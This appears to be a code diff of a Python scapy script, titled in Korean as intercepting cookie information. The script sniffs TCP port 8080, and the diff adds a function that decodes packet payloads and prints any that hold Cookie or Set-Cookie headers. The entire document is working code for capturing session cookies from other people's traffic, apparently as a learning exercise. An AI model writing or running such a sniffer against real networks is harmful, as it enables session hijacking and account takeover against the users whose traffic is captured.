@@ -1,8 +1,15 @@
 #쿠키 정보 가로채기
 
 from scapy.all import *
-#re : 파이썬에서 정규식 지원 모듈
 import re
+
+def cookieSniffer2(packet):
+    if packet.haslayer(Raw):
+        payload = packet[Raw].load.decode(errors='ignore')
+
+        if 'Cookie:' in payload or 'Set-Cookie:' in payload:
+            print('=== COOKIE FOUND ===')
+            print(payload)
 
 def cookieSniffer(packet):
 	tcp = packet.getlayer('TCP')
@@ -15,7 +22,7 @@ def cookieSniffer(packet):
 	
 def main():
 	print('+++START SNIFFING COOKIE')
-	sniff(filter='tcp port 8080', store=0, prn=cookieSniffer)
+	sniff(filter='tcp port 8080', store=0, prn=cookieSniffer2)
 	
 
 if __name__ == '__main__':
